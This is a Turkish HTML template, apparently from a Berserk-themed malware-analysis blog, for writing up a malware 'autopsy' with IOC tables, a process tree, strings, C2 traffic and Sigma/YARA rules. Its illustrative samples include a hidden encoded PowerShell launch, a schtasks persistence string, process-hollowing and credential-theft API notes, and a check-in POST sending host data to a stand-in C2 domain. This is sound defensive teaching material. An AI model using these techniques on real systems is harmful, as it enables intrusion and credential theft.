@@ -1,0 +1,244 @@
+<!DOCTYPE html>
+<html lang="tr">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>[ÖRNEK ŞABLON] Otopsi: Bir Havari'nin Anatomisi — InfectedLab</title>
+<meta name="description" content="Bir malware örneğinin teknik otopsisi için kullanılan InfectedLab şablonu. Bu sayfayı kopyalayıp kendi analizinizi yazabilirsiniz.">
+<link rel="preconnect" href="https://fonts.googleapis.com">
+<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+<link href="https://fonts.googleapis.com/css2?family=Cinzel:wght@500;700;900&family=Cormorant+Garamond:ital,wght@0,400;0,600;1,400&family=JetBrains+Mono:wght@400;600&display=swap" rel="stylesheet">
+<link rel="stylesheet" href="../assets/css/style.css">
+</head>
+<body>
+<div class="grain"></div>
+
+<header class="site-header">
+  <div class="brand">
+    <a href="../index.html" class="brand-link">
+      <span class="brand-mark">⚔</span>
+      <span class="brand-name">InfectedLab</span>
+    </a>
+    <p class="brand-sub">Kara Süvari'nin Saha Defteri</p>
+  </div>
+  <nav class="site-nav">
+    <a href="../index.html">Defter</a>
+    <a href="../about.html">Kara Süvari</a>
+    <a href="../bestiary.html">Bestiary</a>
+    <a href="https://github.com/InfectedLab" target="_blank" rel="noopener">GitHub</a>
+  </nav>
+</header>
+
+<main class="page">
+  <article class="prose">
+    <p class="post-eyebrow">— Otopsi şablonu / [TARİH] —</p>
+    <h1>Otopsi: [Örneğin Adı / Aile / Hash kısaltması]</h1>
+    <p class="lede">
+      Kısa bir saha notu. Bu Havari ne için geldi, kimin kapısını çaldı,
+      hangi koridorda yakalandı? 2-3 cümle yeterli. Berserk dilinden
+      bir cümleyle başla, sonra teknik gerçekliğe geç.
+    </p>
+
+    <h2>I. Saha Notu — Triage</h2>
+    <p>
+      Örneğin nereden geldiği, ilk tetiklenme bağlamı, hangi telemetride
+      göründüğü. Kullanıcı şikâyeti mi, EDR alarmı mı, threat hunt mı?
+    </p>
+
+    <table class="ioc-table">
+      <thead>
+        <tr><th>Alan</th><th>Değer</th></tr>
+      </thead>
+      <tbody>
+        <tr><td>Aile / İsim</td><td>[ör. AsyncRAT — "Slan'ın küçük çocuğu"]</td></tr>
+        <tr><td>Tip</td><td>[Loader / Stealer / RAT / Ransomware]</td></tr>
+        <tr><td>İlk görüldüğü tarih</td><td>[YYYY-MM-DD]</td></tr>
+        <tr><td>Platform</td><td>Windows 10/11 x64</td></tr>
+        <tr><td>Paketleyici</td><td>[UPX / Themida / custom / yok]</td></tr>
+        <tr><td>Dil / derleyici</td><td>[C/C++ MSVC / .NET / Go / Rust]</td></tr>
+      </tbody>
+    </table>
+
+    <h2>II. Damgalar — IOC</h2>
+    <p>
+      Tüm hash, IP, domain, mutex, dosya yolu ve registry anahtarları.
+      Pyramid of Pain'e göre sıralanmış olması, okuyucuya hangisinin
+      gerçekten "acıttığı"nı söyler.
+    </p>
+
+    <table class="ioc-table">
+      <thead>
+        <tr><th>Tip</th><th>Değer</th><th>Not</th></tr>
+      </thead>
+      <tbody>
+        <tr><td>SHA256</td><td class="hash">aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa</td><td>Loader (Stage 1)</td></tr>
+        <tr><td>SHA256</td><td class="hash">bbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbb</td><td>Implant (Stage 2)</td></tr>
+        <tr><td>Domain</td><td>example-c2.tld</td><td>C2, Cloudflare arkasında</td></tr>
+        <tr><td>IP</td><td>198.51.100.42</td><td>VPS / kısa ömürlü</td></tr>
+        <tr><td>Mutex</td><td>Global\Behelit-7B2A</td><td>Tek-örnek garantisi</td></tr>
+        <tr><td>Path</td><td>%APPDATA%\Microsoft\WindowsHelp\svchost.exe</td><td>Persistence kopyası</td></tr>
+      </tbody>
+    </table>
+
+    <h2>III. Behelit'in Çağrısı — Initial Access &amp; Execution</h2>
+    <p>
+      Örneğin sisteme nasıl geldiği. Phishing eki mi, ISO mu, MSI mi,
+      tedarik zinciri mi? Process ağacı çıkar:
+    </p>
+
+    <div class="codeblock">
+      <div class="codeblock-head">
+        <span class="file">process_tree.txt</span>
+        <span class="lang">tree</span>
+      </div>
+<pre><code>explorer.exe
+└── outlook.exe
+    └── winword.exe   (Fatura_2026-04.docm)
+        └── powershell.exe  -nop -w hidden -enc &lt;b64&gt;
+            └── rundll32.exe  C:\Users\...\AppData\Local\Temp\h.dll,Start</code></pre>
+    </div>
+
+    <h2>IV. Havari'nin Anatomisi — Static Analysis</h2>
+    <p>
+      İmport tablosu, string'ler, sections, dikkat çeken API çağrıları.
+      Paketleyici varsa unpack stratejisi.
+    </p>
+
+    <h3>Önemli string'ler</h3>
+<pre><code>schtasks /create /tn "MicrosoftEdgeUpdateTaskMachine" ...
+SeDebugPrivilege
+\\.\pipe\behelit-7B2A
+api/v1/checkin?id=
+.AAAA-BERSERK-KEY-AAAA</code></pre>
+
+    <h3>Dikkat çeken API'ler</h3>
+    <ul>
+      <li><code>NtUnmapViewOfSection</code> + <code>VirtualAllocEx</code> + <code>WriteProcessMemory</code> → klasik <em>Process Hollowing</em>.</li>
+      <li><code>BCryptDecrypt</code> + sabit IV → şifreli payload, anahtar binary içinde.</li>
+      <li><code>CryptUnprotectData</code> → tarayıcı kimlik bilgisi hırsızlığı.</li>
+    </ul>
+
+    <h2>V. Zırh Altındaki Kemik — Dynamic Analysis</h2>
+    <p>
+      Sandbox / debugger gözleminden çıkan davranış. Ekran görüntüsü, akış
+      diyagramı, syscall trace.
+    </p>
+
+    <div class="codeblock">
+      <div class="codeblock-head">
+        <span class="file">x64dbg_log.txt</span>
+        <span class="lang">disasm</span>
+      </div>
+<pre><code>00007FF7`12340000  push    rbp
+00007FF7`12340002  mov     rbp, rsp
+00007FF7`12340005  sub     rsp, 30h
+00007FF7`12340009  lea     rcx, [rip+0x12345]   ; "kernel32.dll"
+00007FF7`12340010  call    LoadLibraryA
+00007FF7`12340015  mov     [rbp-8], rax
+00007FF7`12340019  lea     rdx, [rip+0x12350]   ; "VirtualAlloc"
+00007FF7`12340020  mov     rcx, rax
+00007FF7`12340023  call    GetProcAddress
+00007FF7`12340028  ; --&gt; klasik dynamic API resolution</code></pre>
+    </div>
+
+    <h2>VI. Tanrısal El'le Konuşma — C2 Protokolü</h2>
+    <p>
+      Network trafiği. JA3/JA4 parmak izleri, TLS SNI, HTTP başlık
+      anomalileri, beacon aralığı, jitter.
+    </p>
+
+<pre><code>POST /api/v1/checkin?id=8B11-0017 HTTP/1.1
+Host: example-c2.tld
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64) Behelit/1.0
+X-Brand: 7B2A
+Content-Length: 84
+
+{"hostname":"...","user":"...","os":"10.0.19045","key":"AAAA-BERSERK-KEY-AAAA"}</code></pre>
+
+    <h2>VII. Kara Süvari'nin Cevabı — Detection &amp; Hunt</h2>
+
+    <h3>Sigma kuralı</h3>
+    <div class="codeblock">
+      <div class="codeblock-head">
+        <span class="file">behelit_loader.yml</span>
+        <span class="lang">Sigma</span>
+      </div>
+<pre><code>title: Behelit Loader — winword → powershell → rundll32
+status: experimental
+logsource: { product: windows, category: process_creation }
+detection:
+  s1:
+    ParentImage|endswith: '\winword.exe'
+    Image|endswith: '\powershell.exe'
+  s2:
+    ParentImage|endswith: '\powershell.exe'
+    Image|endswith: '\rundll32.exe'
+    CommandLine|contains: '\AppData\Local\Temp\'
+  condition: s1 or s2
+level: high
+tags: [attack.t1059.001, attack.t1218.011, berserk.behelit]</code></pre>
+    </div>
+
+    <h3>YARA kuralı</h3>
+    <div class="codeblock">
+      <div class="codeblock-head">
+        <span class="file">behelit_loader.yar</span>
+        <span class="lang">YARA</span>
+      </div>
+<pre><code>rule InfectedLab_Behelit_Loader
+{
+    meta:
+        author      = "Kara Süvari (InfectedLab)"
+        description = "Behelit-7B2A loader (Stage 1)"
+        date        = "2026-04-29"
+        ref         = "https://infectedlab.github.io/posts/writeup-template.html"
+    strings:
+        $s1 = "Behelit-7B2A" wide ascii
+        $s2 = "AAAA-BERSERK-KEY-AAAA" ascii
+        $s3 = { 48 8D 0D ?? ?? ?? ?? E8 ?? ?? ?? ?? 48 89 45 ?? }  // LoadLibraryA pattern
+    condition:
+        uint16(0) == 0x5A4D and 2 of them
+}</code></pre>
+    </div>
+
+    <h2>VIII. Damga ve Defter — Sonuç</h2>
+    <p>
+      Bu Havari nereden geldi, ne yapmaya çalıştı, hangi acıyı bıraktı?
+      Bir paragraf. Sonraki olası sürüm için tahmin: hangi TTP'leri
+      değiştirebilir, hangi imzalar kalıcıdır?
+    </p>
+
+    <p class="signoff">— Kara Süvari, [yer], [saat]. Defter kapanır.</p>
+
+    <nav class="post-nav">
+      <a href="../index.html" class="btn btn-ghost">← Deftere Dön</a>
+      <a href="../bestiary.html" class="btn btn-primary">Bestiary'i Aç →</a>
+    </nav>
+  </article>
+</main>
+
+<footer class="site-footer">
+  <div class="footer-cols">
+    <div>
+      <p class="brand-name small">InfectedLab</p>
+      <p class="footer-note">Bu defter bir kurgudur ve eğitim amaçlıdır. Berserk evreni Kentaro Miura'ya aittir.</p>
+    </div>
+    <div>
+      <p class="footer-head">Bağlantılar</p>
+      <ul>
+        <li><a href="https://github.com/InfectedLab" target="_blank" rel="noopener">GitHub</a></li>
+        <li><a href="../bestiary.html">Bestiary</a></li>
+        <li><a href="../about.html">Kara Süvari Hakkında</a></li>
+      </ul>
+    </div>
+    <div>
+      <p class="footer-head">Damga</p>
+      <p class="footer-note">"Her zafer, bir sonraki demonu çağırır."</p>
+    </div>
+  </div>
+  <p class="copyright">© <span id="year"></span> InfectedLab — Kara Süvari'nin Defteri</p>
+</footer>
+
+<script src="../assets/js/main.js"></script>
+</body>
+</html>
